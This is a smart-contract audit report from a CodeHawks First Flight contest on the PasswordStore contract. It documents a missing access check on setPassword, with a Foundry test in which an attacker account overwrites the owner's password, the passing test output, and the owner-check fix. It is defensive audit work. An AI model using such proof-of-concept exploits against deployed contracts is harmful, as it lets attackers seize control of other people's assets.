
# First Flight #1: PasswordStore - Findings Report

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #1

### Dates: Oct 18th, 2023 - Oct 25th, 2023

[See more contest details here](https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 0
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. setPassword can be called by attacker, loss of password            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L26

## Summary
`PasswordStore::setPassword` function is only called by `s_owner` of the protocol, but any user/attacker can call that function.

## Vulnerability Details
According to the protocol, `PasswordStore::setPassword` functions should have access control so that only `s_owner` can call this functions.

## Impact
Any attacker can change/set the password according to their need that leads to the loss of original password set by `s_owner`.
// here is proof, I've written a unit test in foundry

```solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";
import {Test, console} from "forge-std/Test.sol";

contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    address ATTACKER = makeAddr("attacker");
    address public owner;

    function setUp() public {
        DeployPasswordStore deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
    }

    function test_onwer_can_set_password() public {
        //owner is setting the password
        vm.startPrank(owner);
        string memory expectedPassword = "ownerPassword";
        passwordStore.setPassword(expectedPassword);
        //onwer is getting the password
        string memory actualPassword = passwordStore.getPassword();
        assertEq(expectedPassword, actualPassword);
    }

    function test_attacker_can_also_set_password() public {
        //attacker is setting the password
        vm.startPrank(ATTACKER);
        string memory expectedPassword = "attackerPassword";
        passwordStore.setPassword(expectedPassword);
        //owner is getting the password set by attacker ie. attackerPassword
        vm.startPrank(owner);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(expectedPassword, actualPassword);
    }
}
```
// here is the result
```
Running 2 tests for test/PasswordStoreTest.t.sol:PasswordStoreTest
[PASS] test_attacker_can_also_set_password() (gas: 41706)
[PASS] test_onwer_can_set_password() (gas: 39261)
Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 941.58µs
Ran 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## Tools Used
VS Code, Foundry

## Recommendations
Use modifier or require or if statement for access control
```diff
+    if (msg.sender != s_owner) {
+          revert PasswordStore__NotOwner();
+      }
```

//After using above code your function should look like this
```solidity
 function setPassword(string memory newPassword) external {
        if (msg.sender != s_owner) {
            revert PasswordStore__NotOwner();
        }
        s_password = newPassword;
        emit SetNetPassword();
    }
```
		
